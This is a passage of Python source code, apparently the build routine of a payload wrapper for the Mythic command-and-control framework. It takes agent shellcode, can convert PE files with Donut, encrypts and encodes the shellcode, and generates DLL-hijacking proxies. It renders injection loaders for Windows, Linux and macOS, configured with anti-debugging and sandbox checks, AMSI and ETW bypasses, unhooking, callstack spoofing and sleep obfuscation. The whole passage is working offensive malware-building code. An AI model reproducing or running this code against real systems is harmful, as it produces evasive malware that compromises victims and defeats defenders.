            loader_exports_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "defs" / "proxy.def"

            dll_target_path = templates_path / "dll_target.dll"

            templates_path = str(templates_path)
            dll_exports_path = str(dll_exports_path)
            loader_exports_path = str(loader_exports_path)
            Path(loader_exports_path).parent.mkdir(parents=True, exist_ok=True)

            # Create payload directory if it doesn't exist
            payload_dir = Path(agent_build_path) / "payload"
            payload_dir.mkdir(parents=True, exist_ok=True)

            environment = Environment(loader=FileSystemLoader(templates_path))

            custom_sc_enabled = self.get_parameter("0.0a Enable Custom Shellcode")

            # Validate wrapped_payload - only required when not using custom shellcode
            if self.wrapped_payload is None and not custom_sc_enabled:
                await self._fail_step(response, "[T1005] - Gathering Files",
                    "No wrapped payload provided. The wrapped_payload is None.",
                    "No wrapped payload provided (wrapped_payload is None).")
                return response

            # Write Mythic payload as the initial shellcode source (may be overridden below)
            with open(mythic_shellcode_path, "wb") as file:
                if self.wrapped_payload is not None:
                    file.write(self.wrapped_payload)

            # Custom shellcode override - replaces the Mythic payload entirely
            if custom_sc_enabled:
                custom_sc_uuid = self.get_parameter("0.0b Custom Shellcode File")
                if not custom_sc_uuid:
                    await self._fail_step(response, "[T1005] - Gathering Files",
                        "Custom Shellcode is enabled but no file was uploaded.",
                        "Custom shellcode enabled but no file provided.")
                    return response

                custom_sc_resp = await SendMythicRPCFileGetContent(
                    MythicRPCFileGetContentMessage(AgentFileId=custom_sc_uuid)
                )
                if not custom_sc_resp.Success or not custom_sc_resp.Content:
                    await self._fail_step(response, "[T1005] - Gathering Files",
                        "Failed to retrieve custom shellcode file from Mythic.",
                        "Failed to retrieve custom shellcode file.")
                    return response

                with open(mythic_shellcode_path, "wb") as file:
                    file.write(custom_sc_resp.Content)

                output += "[+] Custom shellcode loaded - Mythic wrapped payload ignored.\n"
                await self._build_step("[T1005] - Gathering Files", f"Custom shellcode loaded ({len(custom_sc_resp.Content)} bytes). Mythic payload overridden.", success=True)

            if os.stat(mythic_shellcode_path).st_size == 0:
                await self._fail_step(response, "[T1005] - Gathering Files",
                    "Shellcode file is empty - nothing to process.",
                    "Shellcode file is empty after write.")
                return response

            response.status = BuildStatus.Success
            response.build_message = "Files Gathered for Modification."
            await self._build_step("[T1005] - Gathering Files", "Gathered files to obfuscate shellcode", success=True)

            # ===== Donut PE → Shellcode Conversion =====
            donut_enabled = self.get_parameter("0.0c Enable Donut")
            if donut_enabled:
                donut_uuid = self.get_parameter("0.0d Donut Input File")
                if not donut_uuid:
                    await self._fail_step(response, "[T1027] - Donut Conversion",
                        "Donut is enabled but no input file was uploaded.",
                        "Donut enabled but no PE/DLL file provided.")
                    return response

                donut_resp = await SendMythicRPCFileGetContent(
                    MythicRPCFileGetContentMessage(AgentFileId=donut_uuid)
                )
                if not donut_resp.Success or not donut_resp.Content:
                    await self._fail_step(response, "[T1027] - Donut Conversion",
                        "Failed to retrieve Donut input file from Mythic.",
                        "Failed to retrieve Donut input file.")
                    return response

                donut_input_path = str(PurePath(agent_build_path) / "shellcode" / "donut_input.bin")
                with open(donut_input_path, "wb") as f:
                    f.write(donut_resp.Content)

                donut_ok, donut_msg = donut_convert(
                    input_path=donut_input_path,
                    output_path=mythic_shellcode_path,
                    arch=self.get_parameter("0.0e Donut Architecture") or "x64",
                    args=self.get_parameter("0.0f Donut Args") or "",
                )
                if not donut_ok:
                    await self._fail_step(response, "[T1027] - Donut Conversion",
                        f"Donut conversion failed: {donut_msg}",
                        f"Donut failed: {donut_msg}")
                    return response

                output += f"[+] {donut_msg}\n"
                await self._build_step("[T1027] - Donut Conversion", donut_msg, success=True)

            ######################### Shellcode Obfuscation Section #########################
            # Defaults for config template rendering (may be updated after shellcrypt output)
            encryption_type_map = {
                "NONE": 0,
                "XOR": 1,
                "RC4": 2,
                "AES_ECB": 3,
                "AES_CBC": 4,
            }
            encryption_type_value = encryption_type_map.get(self.get_parameter("2.1 Encryption Type"), 0)
            encryption_key_bytes = "0x00"
            encryption_iv_bytes = ", ".join(["0x00"] * 16)
            if not donut_enabled:
                with open(str(mythic_shellcode_path), "rb") as f:
                    header = f.read(2)
                    if header == b"\x4d\x5a":
                        await self._fail_step(response, "[T1027] - Header Check",
                            "Supplied payload is a PE instead of raw shellcode.",
                            "Found leading MZ header - supplied file was not shellcode")
                        return response
                response.status = BuildStatus.Success
                response.build_message = "No leading MZ header found in payload."
                await self._build_step("[T1027] - Header Check", "No leading MZ header found in payload", success=True)

            # R2a: command construction lives in plugin_shellcode_obfuscation
            # (pure function in archive/shellcode_obfuscation.py). The async
            # subprocess run + output accumulation stays here because it's
            # tied to build()'s response/output state and would need a
            # context object to push into a plugin cleanly.
            _comp = self.get_parameter("2.0 Compression Type")
            _enc = self.get_parameter("2.3 Encoding Type")
            _key = self.get_parameter("2.2 Encryption Key")
            cmd = build_obfuscation_cmd(
                shellcrypt_path,
                mythic_shellcode_path,
                obfuscated_shellcode_path,
                encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                loader_type=self.get_parameter("0.1 Loader Type"),
                shellcode_format=self.get_parameter("2.4 Shellcode Format"),
                compression_method=(COMPRESSION_METHODS[_comp] if _comp and _comp != "NONE" else None),
                encoding_method=(ENCODING_METHODS[_enc] if _enc and _enc != "NONE" else None),
                encryption_key=_key,
            )

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if os.path.exists(obfuscated_shellcode_path):
                # Parse key/IV directly out of the C source shellcrypt
                # just wrote in the first invocation above. The previous
                # implementation re-ran shellcrypt to "extract" the key,
                # but when the operator picks Encryption Key = "NONE"
                # shellcrypt autogenerates a fresh random key per run -
                # so the extracted key came from a SECOND keystream that
                # didn't match the encrypted shellcode written on the
                # first run. RC4/AES then decrypted to garbage at
                # runtime and the loader never executed shellcode.
                #
                # ClickOnce uses -f csharp on call 1 so its file isn't
                # parseable by the C-format regex; for that path we fall
                # back to the existing CSharp key parser below (which
                # reads the same call-1 file).
                try:
                    _ldr = self.get_parameter("0.1 Loader Type")
                    if _ldr != "ClickOnce":
                        with open(obfuscated_shellcode_path, "r", encoding="utf-8", errors="replace") as _f:
                            shellcode_src = _f.read()
                        _key_parsed, _iv_parsed = parse_key_iv(shellcode_src)
                        if _key_parsed is not None:
                            encryption_key_bytes = _key_parsed
                        if _iv_parsed is not None:
                            encryption_iv_bytes = _iv_parsed
                except Exception as e:
                    output += f"[WARN] Failed to parse shellcrypt key/IV from {obfuscated_shellcode_path}: {str(e)}\n"

                # Copy the obfuscated shellcode file over to the shellcode.hpp file
                if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))
                    output += f"[DEBUG] Copied C shellcode to {encrypted_shellcode_path_sc}\n"
                elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
                    # For CSharp format, copy to encrypted_shellcode_path_sc which will be read later
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))
                    output += f"[DEBUG] Copied CSharp shellcode to {encrypted_shellcode_path_sc}\n"
                elif self.get_parameter("0.1 Loader Type") == "VM Loader":
                    # VM Loader: vmloader_builder applies its own XOR layer.
                    # Write raw bytes as a C array into shellcode.hpp so the
                    # native builder binary reads unencrypted shellcode.
                    with open(str(mythic_shellcode_path), "rb") as _f:
                        _raw = _f.read()
                    _hex = ", ".join(f"0x{b:02X}" for b in _raw)
                    with open(encrypted_shellcode_path_sc, "w") as _f:
                        _f.write(
                            f"unsigned char key[] = {{ 0x00 }};\n"
                            f"unsigned char nonce[] = {{ 0x00 }};\n"
                            f"unsigned char shellcode[] = {{ {_hex} }};\n"
                        )
                    output += f"[DEBUG] Wrote {len(_raw)} raw bytes to shellcode.hpp for VM Loader\n"
                elif self.get_parameter("0.0 Main Payload Type") == "Hijack":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))
                elif self.get_parameter("0.0 Target OS") == "Linux":
                    # Write raw shellcode bytes as a C array into the NixLoader header.
                    # The Linux loader embeds shellcode directly without a Win32 decrypt
                    # pipeline - obfuscation is applied at the trigger/delivery layer.
                    with open(str(mythic_shellcode_path), "rb") as _f:
                        _raw = _f.read()
                    _hex = ", ".join(f"0x{b:02X}" for b in _raw)
                    with open(nix_shellcode_h, "w") as _f:
                        _f.write(
                            "#pragma once\n"
                            "#include <stddef.h>\n"
                            f"static unsigned char shellcode[] = {{ {_hex} }};\n"
                        )
                    output += f"[DEBUG] Wrote {len(_raw)} raw bytes to {nix_shellcode_h}\n"
                elif self.get_parameter("0.0 Target OS") == "macOS":
                    with open(str(mythic_shellcode_path), "rb") as _f:
                        _raw = _f.read()
                    _hex = ", ".join(f"0x{b:02X}" for b in _raw)
                    with open(mac_shellcode_h, "w") as _f:
                        _f.write(
                            "#pragma once\n"
                            "#include <stddef.h>\n"
                            f"static unsigned char shellcode[] = {{ {_hex} }};\n"
                        )
                    output += f"[DEBUG] Wrote {len(_raw)} raw bytes to {mac_shellcode_h}\n"

                if self.get_parameter("2.4 Shellcode Format") == "Raw":
                    # Raw format: re-run shellcrypt in C mode and slice the
                    # `unsigned char key[] = {...};` declaration out of
                    # stdout so the loader can compile it in directly.
                    cmd = build_raw_key_cmd(
                        shellcrypt_path,
                        mythic_shellcode_path,
                        encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                        encryption_key=self.get_parameter("2.2 Encryption Key"),
                    )
                    _proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    _out, _err = await _proc.communicate()
                    if _proc.returncode != 0:
                        raise subprocess.CalledProcessError(_proc.returncode, cmd, _out, _err)
                    shellcode_src = _out.decode()
                    output += shellcode_src
                    key_array = extract_raw_key_array(shellcode_src)
                    output += key_array
                    with open(encrypted_shellcode_path_sc, "w") as file:
                        file.write(key_array)

                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    response.build_stdout = output + "\n" + obfuscated_shellcode_path
                    response.updated_filename = "erebus_wrapper.bin"
                    await self._build_step("[T1027] - Shellcode Obfuscation", "Obfuscated Shellcode - Continuing to Next Step", success=True)
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    await self._build_step("[T1027] - Shellcode Obfuscation", "Obfuscated Shellcode - Continuing to Next Step", success=True)

            elif process.returncode != 0:
                response.payload = b""
                await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response

            else:
                response.payload = b""
                response.status = BuildStatus.Error
                await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response
            output = ""
            ######################### End of Shellcode Obfuscation Section #########################

            ######################### Payload Build Section #########################
            # Determine payload type and configure accordingly
            payload_type = self.get_parameter("0.0 Main Payload Type")
            dll_file_name = None  # Used to store DLL filename for final payload naming

            # Override payload_type for non-Windows targets so the Linux/macOS
            # compilation path is taken instead of the Windows Loader/Hijack path.
            _target_os = self.get_parameter("0.0 Target OS")
            if _target_os == "Linux":
                payload_type = "Linux"
            elif _target_os == "macOS":
                payload_type = "macOS"

            print(f'User Selected: {payload_type} (Target OS: {_target_os})')

            if payload_type == "Hijack":
                # [DLL HIJACK SPECIFIC] Get the DLL target file from Mythic
                file_content = await getFileFromMythic(
                    agentFileId=self.get_parameter("1.0 DLL Hijacking")
                )

                file_name_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    AgentFileID=self.get_parameter("1.0 DLL Hijacking")
                ))

                dll_file_name = ""
                if file_name_resp.Success and len(file_name_resp.Files) > 0:
                    dll_file_name = file_name_resp.Files[0].Filename
                if not dll_file_name:
                    dll_file_name = f"{self.get_parameter('1.0 DLL Hijacking')}.dll"

                with open(dll_target_path, "wb") as file:
                    file.write(file_content)

                # [DLL HIJACK SPECIFIC] Generate proxy exports
                exports = await generate_proxies(dll_file=dll_target_path, dll_file_name=dll_file_name)
                output += f"[DEBUG] Generated exports ({len(exports) if exports else 0} chars):\n{exports[:500] if exports else 'None'}\n"

                exports_list = {"EXPORTS": exports}
                proxy_template = environment.get_template("proxy.def")
                proxy_output = proxy_template.render(**exports_list)

                with open(dll_exports_path, "w") as file:
                    file.write(proxy_output)

                # Validate proxy.def was generated with actual exports
                if not exports or len(exports.strip()) == 0 or os.stat(dll_exports_path).st_size <= 20:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to proxy the given file. No exports found or file too small ({os.stat(dll_exports_path).st_size} bytes)."
                    await self._build_step("[T1518] - Gathering DLL Exports for Hijacking", f"Failed to proxy the given file. Generated proxy.def is {os.stat(dll_exports_path).st_size} bytes.", success=False)
                    return response

                shutil.copy(src=dll_exports_path, dst=loader_exports_path)

                # Copy the original DLL into the payload directory as <name>_orig.dll
                # so the forwarder chain resolves correctly at runtime
                orig_dll_name = f"{Path(dll_file_name).stem}_orig{Path(dll_file_name).suffix}"
                orig_dll_path = Path(agent_build_path) / "payload" / orig_dll_name
                with open(str(orig_dll_path), "wb") as f:
                    f.write(file_content)

                response.status = BuildStatus.Success
                response.build_message = "DLL Proxied! Compiling Payload..."
                await self._build_step("[T1518] - Gathering DLL Exports for Hijacking", "DLL Proxied! Compiling Payload...", success=True)

            elif payload_type == "Loader":
                loader_type = self.get_parameter("0.1 Loader Type")

                if loader_type == "Shellcode Loader":
                    shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin",
                                src=obfuscated_shellcode_path)

                    # ===== Configure Shellcode Loader config.hpp =====
                    config_hpp_destination = PurePath(shellcode_loader_path) / "include" / "config.hpp"
                    config_hpp_destination = str(config_hpp_destination)

                    try:
                        # Load and render the config template
                        config_template = environment.get_template("config.hpp")
                        # Escape backslashes for C++ wide string literal
                        target_process = self.get_parameter("0.5 Shellcode Loader - Target Process").replace("\\", "\\\\")
                        compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                        encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)

                        # Guardrails configuration for Shellcode Loader
                        guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
                        guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
                        guardrails_check_remote = 1 if self.get_parameter("0.5c Check Remote Debugger") else 0
                        guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
                        guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
                        guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
                        guardrails_check_sandbox = 1 if self.get_parameter("0.5f1 Check Sandbox Environment") else 0
                        guardrails_check_uptime = 1 if self.get_parameter("0.5f2 Check System Uptime") else 0
                        guardrails_uptime_min_sec = int(self.get_parameter("0.5f3 Minimum Uptime Seconds") or 300)
                        guardrails_check_screen_res = 1 if self.get_parameter("0.5f4 Check Screen Resolution") else 0
                        guardrails_check_secure_boot = 1 if self.get_parameter("0.5f5 Check Secure Boot") else 0
                        single_instance = 1 if self.get_parameter("0.5v Single Instance") else 0

                        # Parse the list-based guardrail parameters and
                        # thread them into config.hpp. These render as
                        # XOR-encrypted byte arrays inside the generated
                        # DecryptGuardrailLists()/GetGuardrailConfig()
                        # helpers (see collect_guardrail_gr_lists + the
                        # config.hpp template for the decryption flow).
                        gr_block = collect_guardrail_gr_lists(
                            self,
                            bool(guardrails_enabled),
                            {
                                "GUARDRAIL_ALLOWED_HOSTNAMES": "0.5g Hostname Whitelist",
                                "GUARDRAIL_BLOCKED_HOSTNAMES": "0.5h Block Analysis Hostnames",
                                "GUARDRAIL_BLOCKED_USERNAMES": "0.5i Block Analysis Usernames",
                                "GUARDRAIL_ALLOWED_IPS":       "0.5j IP Whitelist",
                                "GUARDRAIL_BLOCKED_IPS":       "0.5k IP Blacklist",
                                "GUARDRAIL_ALLOWED_DOMAINS":   "0.5l Domain Whitelist",
                            },
                        )

                        # R2b: config_data dict construction lives in
                        # plugin_loader_config (pure helper). Template
                        # render + disk write remain here because they're
                        # bound to the Jinja env + destination path.
                        config_data = build_loader_config_data(
                            target_process=target_process,
                            injection_type=self.get_parameter("0.4 Shellcode Loader - Injection Type"),
                            compression_type_value=compression_type_value,
                            encoding_type_value=encoding_type_value,
                            encryption_type_value=encryption_type_value,
                            encryption_key_bytes=encryption_key_bytes,
                            encryption_iv_bytes=encryption_iv_bytes,
                            guardrails_enabled=guardrails_enabled,
                            guardrails_check_debugger=guardrails_check_debugger,
                            guardrails_check_remote_debugger=guardrails_check_remote,
                            guardrails_check_debugger_processes=guardrails_check_processes,
                            guardrails_check_hardware_breakpoints=guardrails_check_hwbp,
                            guardrails_check_timing=guardrails_check_timing,
                            guardrails_check_sandbox=guardrails_check_sandbox,
                            guardrails_decoy_file="decoy.pdf" if self.get_parameter("0.13 Decoy File Inclusion") else "",
                            gr_block=gr_block,
                            syscall_backend={"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0),
                            callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
                            callstack_spoof_modules=(
                                parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
                                or ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]
                            ),
                            sleep_obfuscation_type={"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
                                self.get_parameter("0.5p Sleep Obfuscation"), 0),
                            sleep_obfuscation_base_ms=int(self.get_parameter("0.5q Sleep Base MS") or 5000),
                            sleep_obfuscation_jitter_ms=int(self.get_parameter("0.5r Sleep Jitter MS") or 3000),
                            amsi_bypass_type=int(self.get_parameter("0.5s AMSI Bypass Type") or 1),
                            etw_bypass_type=int(self.get_parameter("0.5t ETW Bypass Type") or 1),
                            unhook_scope=int(self.get_parameter("0.5u Unhook Scope") or 1),
                            guardrails_check_uptime=guardrails_check_uptime,
                            guardrails_uptime_min_seconds=guardrails_uptime_min_sec,
                            guardrails_check_screen_resolution=guardrails_check_screen_res,
                            guardrails_check_secure_boot=guardrails_check_secure_boot,
                            single_instance=single_instance,
                        )
                        rendered_config = config_template.render(**config_data)

                        # Write the rendered config to the destination
                        with open(config_hpp_destination, "w") as config_file:
                            config_file.write(rendered_config)

                        response.status = BuildStatus.Success
                        response.build_message = "Shellcode Loader config generated!"
                        await self._build_step("[T1036] - Configuring Shellcode Loader", "Generated config.hpp with user-defined injection parameters", success=True)
                    except Exception as e:
                        await self._fail_step(response, "[T1036] - Configuring Shellcode Loader",
                            f"Failed to render Shellcode Loader config: {str(e)}",
                            f"Failed to render config.hpp: {str(e)}")
                        return response

                elif loader_type == "ClickOnce":
                    # ===== Configure ClickOnce InjectionConfig.cs =====
                    injection_config_destination = PurePath(clickonce_loader_path) / "InjectionConfig.cs"
                    injection_config_destination = str(injection_config_destination)

                    try:
                        encryption_key_bytes_clickonce = ""
                        encrypted_shellcode_bytes_clickonce = ""
                        if os.path.exists(encrypted_shellcode_path_sc):
                            try:
                                with open(encrypted_shellcode_path_sc, "r") as combined_file:
                                    combined_content = combined_file.read()
                                    output += f"[DEBUG] File read from: {encrypted_shellcode_path_sc}\n"
                                    output += f"[DEBUG] File size: {len(combined_content)} bytes\n"
                                    output += f"[DEBUG] First 500 chars: {combined_content[:500]}\n"
                                    import re

                                    # Extract key array bytes - handles both C++ and C# formats
                                    # Matches: key[2] = { ... } or byte[] key[2] = { ... }
                                    key_match = re.search(r'(?:byte\[\]\s+)?key\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if key_match:
                                        key_section = key_match.group(1)
                                        hex_key = re.findall(r'0x[0-9a-fA-F]{2}', key_section)
                                        if hex_key:
                                            encryption_key_bytes_clickonce = ", ".join(hex_key)
                                            output += f"[DEBUG] Extracted encryption key bytes: {encryption_key_bytes_clickonce}\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in key section: {key_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Key array not found in file\n"

                                    # Extract shellcode array bytes - handles both C++ and C# formats
                                    # Matches: shellcode[113] = { ... } or sh3llc0d3[113] = { ... } or byte[] shellcode[113] = { ... }
                                    shellcode_match = re.search(r'(?:byte\[\]\s+)?(?:sh3llc0d3|shellcode)\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if shellcode_match:
                                        shellcode_section = shellcode_match.group(1)
                                        hex_shellcode = re.findall(r'0x[0-9a-fA-F]{2}', shellcode_section)
                                        if hex_shellcode:
                                            encrypted_shellcode_bytes_clickonce = ", ".join(hex_shellcode)
                                            output += f"[DEBUG] Extracted shellcode bytes (count: {len(hex_shellcode)})\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in shellcode section: {shellcode_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Shellcode array not found in file\n"

                            except Exception as extract_error:
                                output += f"Warning: Could not extract encryption key or shellcode: {str(extract_error)}\n"
                        else:
                            output += f"[DEBUG] File does not exist: {encrypted_shellcode_path_sc}\n"

                        injection_config_template = environment.get_template("InjectionConfig.cs")
                        compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                        encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)

                        # Guardrails configuration for ClickOnce
                        guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
                        guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
                        guardrails_check_remote = 1 if self.get_parameter("0.5c Check Remote Debugger") else 0
                        guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
                        guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
                        guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
                        guardrails_check_sandbox = 1 if self.get_parameter("0.5f1 Check Sandbox Environment") else 0

                        injection_config_data = {
                            "COMPRESSION_TYPE": compression_type_value,
                            "ENCODING_TYPE": encoding_type_value,
                            "ENCRYPTION_TYPE": encryption_type_value,
                            "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
                            "TARGET_PROCESS": self.get_parameter("0.7 ClickOnce - Target Process"),
                            "ENCRYPTION_KEY": encryption_key_bytes_clickonce,
                            "ENCRYPTION_SHELLCODE": encrypted_shellcode_bytes_clickonce,
                            "GUARDRAILS_ENABLED": "true" if guardrails_enabled else "false",
                            "DEBUG_LOGGING_ENABLED": "false",  # never ship debug logging; operator can manually flip in InjectionConfig.cs for testing
                            "GUARDRAILS_CHECK_DEBUGGER": "true" if guardrails_check_debugger else "false",
                            "GUARDRAILS_CHECK_REMOTE_DEBUGGER": "true" if guardrails_check_remote else "false",
                            "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": "true" if guardrails_check_processes else "false",
                            "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": "true" if guardrails_check_hwbp else "false",
                            "GUARDRAILS_CHECK_TIMING": "true" if guardrails_check_timing else "false",
                            "GUARDRAILS_CHECK_SANDBOX": "true" if guardrails_check_sandbox else "false",
                            "BLOCKED_PROCESSES": array_to_csharp_string(DEFAULT_BLOCKED_PROCESSES),
                            "ALLOWED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "BLOCKED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "BLOCKED_USERNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "ALLOWED_IPS": array_to_csharp_string(parse_csv(self.get_parameter("0.5j IP Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "BLOCKED_IPS": array_to_csharp_string(parse_csv(self.get_parameter("0.5k IP Blacklist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "ALLOWED_DOMAINS": array_to_csharp_string(parse_csv(self.get_parameter("0.5l Domain Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                        }
                        rendered_injection_config = injection_config_template.render(**injection_config_data)

                        with open(injection_config_destination, "w") as config_file:
                            config_file.write(rendered_injection_config)

                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce config generated!"
                        await self._build_step("[T1204.002] - Configuring ClickOnce Loader", "Generated InjectionConfig.cs with user-defined injection parameters", success=True)
                    except Exception as e:
                        await self._fail_step(response, "[T1204.002] - Configuring ClickOnce Loader",
                            f"Failed to render ClickOnce config: {str(e)}",
                            f"Failed to render InjectionConfig.cs: {str(e)}")
                        return response

            # ===== Configure & Compile Payload (Unified for all types) =====
            # Configure guadrails if applicable
            if payload_type == "Hijack":
                guardrail_template = environment.get_template("guardrail.hpp")
                guardrails_enabled = self.get_parameter("1.1 Use Built-in Guardrails")
                guardrail_data = {
                    "use_builtin_guardrails": guardrails_enabled,
                    "check_debugger": self.get_parameter("1.1a Check IsDebuggerPresent") if guardrails_enabled else False,
                    "check_remote_debugger": self.get_parameter("1.1b Check Remote Debugger") if guardrails_enabled else False,
                    "check_debugger_processes": self.get_parameter("1.1c Check Debugger Processes") if guardrails_enabled else False,
                    "check_hardware_breakpoints": self.get_parameter("1.1d Check Hardware Breakpoints") if guardrails_enabled else False,
                    "check_timing": self.get_parameter("1.1e Check Timing Anomalies") if guardrails_enabled else False,
                    "allowed_hostnames": parse_csv(self.get_parameter("1.1f Hostname Whitelist")) if guardrails_enabled else [],
                    "blocked_hostnames": parse_csv(self.get_parameter("1.1g Block Analysis Hostnames")) if guardrails_enabled else [],
                    "blocked_usernames": parse_csv(self.get_parameter("1.1h Block Analysis Usernames")) if guardrails_enabled else [],
                    "allowed_ips": parse_csv(self.get_parameter("1.1i IP Whitelist")) if guardrails_enabled else [],
                    "blocked_ips": parse_csv(self.get_parameter("1.1j IP Blacklist")) if guardrails_enabled else [],
                    "allowed_domains": parse_csv(self.get_parameter("1.1k Domain Whitelist")) if guardrails_enabled else [],
                }
                guardrail_output = guardrail_template.render(**guardrail_data)
                guardrail_hpp_path = PurePath(shellcode_loader_path) / "include" / "guardrail.hpp"
                with open(str(guardrail_hpp_path), "w") as file:
                    file.write(guardrail_output)

                # Render config.hpp for Hijack build so encryption/compression settings take effect
                try:
                    config_template = environment.get_template("config.hpp")
                    compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                    encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
                    gr_block_hijack = collect_guardrail_gr_lists(
                        self,
                        bool(guardrails_enabled),
                        {
                            "GUARDRAIL_ALLOWED_HOSTNAMES": "1.1f Hostname Whitelist",
                            "GUARDRAIL_BLOCKED_HOSTNAMES": "1.1g Block Analysis Hostnames",
                            "GUARDRAIL_BLOCKED_USERNAMES": "1.1h Block Analysis Usernames",
                            "GUARDRAIL_ALLOWED_IPS":       "1.1i IP Whitelist",
                            "GUARDRAIL_BLOCKED_IPS":       "1.1j IP Blacklist",
                            "GUARDRAIL_ALLOWED_DOMAINS":   "1.1k Domain Whitelist",
                        },
                    )
                    # R2b: shared config_data builder. Hijack hardcodes
                    # INJECTION_TYPE=2 (CreateFiber) because the DLL
                    # already runs in the hijacked process, and uses the
                    # 1.1* parameter namespace for guardrail toggles.
                    config_data = build_loader_config_data(
                        target_process="",
                        injection_type=2,
                        compression_type_value=compression_type_value,
                        encoding_type_value=encoding_type_value,
                        encryption_type_value=encryption_type_value,
                        encryption_key_bytes=encryption_key_bytes,
                        encryption_iv_bytes=encryption_iv_bytes,
                        guardrails_enabled=1 if guardrails_enabled else 0,
                        guardrails_check_debugger=1 if self.get_parameter("1.1a Check IsDebuggerPresent") and guardrails_enabled else 0,
                        guardrails_check_remote_debugger=1 if self.get_parameter("1.1b Check Remote Debugger") and guardrails_enabled else 0,
                        guardrails_check_debugger_processes=1 if self.get_parameter("1.1c Check Debugger Processes") and guardrails_enabled else 0,
                        guardrails_check_hardware_breakpoints=1 if self.get_parameter("1.1d Check Hardware Breakpoints") and guardrails_enabled else 0,
                        guardrails_check_timing=1 if self.get_parameter("1.1e Check Timing Anomalies") and guardrails_enabled else 0,
                        guardrails_check_sandbox=0,
                        guardrails_decoy_file="",
                        gr_block=gr_block_hijack,
                        syscall_backend={"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0),
                        callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
                        callstack_spoof_modules=(
                            parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
                            or ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]
                        ),
                        sleep_obfuscation_type=0,
                        sleep_obfuscation_base_ms=0,
                        sleep_obfuscation_jitter_ms=0,
                    )
                    rendered_config = config_template.render(**config_data)
                    config_hpp_destination = str(PurePath(shellcode_loader_path) / "include" / "config.hpp")
                    with open(config_hpp_destination, "w") as config_file:
                        config_file.write(rendered_config)
